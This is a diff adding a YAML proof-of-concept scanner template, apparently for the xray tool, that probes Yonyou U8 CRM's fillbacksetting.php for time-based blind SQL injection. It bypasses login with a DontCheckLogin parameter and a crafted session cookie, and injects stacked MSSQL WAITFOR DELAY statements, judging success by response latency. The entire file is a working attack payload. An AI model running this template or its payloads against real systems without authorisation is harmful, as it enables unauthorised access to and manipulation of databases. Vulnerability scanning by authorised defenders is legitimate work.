@@ -1,0 +1,27 @@
+name: poc-yaml-yongyouU8-CRM-fillbacksetting.php-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:8'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487867&idx=1&sn=f673ef7f776af4d39b6385d27f684db0&chksm=c267a448f5102d5ecdd73438a8497782f43048b682f9f707a9bb6feb4634d2eb524b43d749de&token=129725642&lang=zh_CN#rd
